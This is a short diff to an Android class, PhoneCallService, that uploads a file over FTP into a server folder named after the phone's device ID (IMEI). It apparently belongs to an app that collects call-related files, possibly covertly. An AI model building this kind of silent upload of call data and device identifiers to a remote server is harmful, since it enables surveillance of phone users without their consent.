@@ -18,6 +18,7 @@ import java.io.File;
 
 import it.sauronsoftware.ftp4j.FTPClient;
 import it.sauronsoftware.ftp4j.FTPDataTransferListener;
+import it.sauronsoftware.ftp4j.FTPException;
 
 /**
  * Created by ahmed on 23/06/16.
@@ -147,9 +148,12 @@ public class PhoneCallService extends BroadcastReceiver {
             client.setType(FTPClient.TYPE_BINARY);
             client.changeDirectory("/");
 
-            /*client.createDirectory("/"+"ahmed");
-            client.changeDirectory("/"+"ahmed");*/
-
+            try {
+                client.changeDirectory(((TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE)).getDeviceId());
+            } catch(FTPException e) {
+                client.createDirectory(((TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE)).getDeviceId());
+                client.changeDirectory(((TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE)).getDeviceId());
+            }
             client.upload(fileName, new MyTransferListener());
 
         } catch (Exception e) {
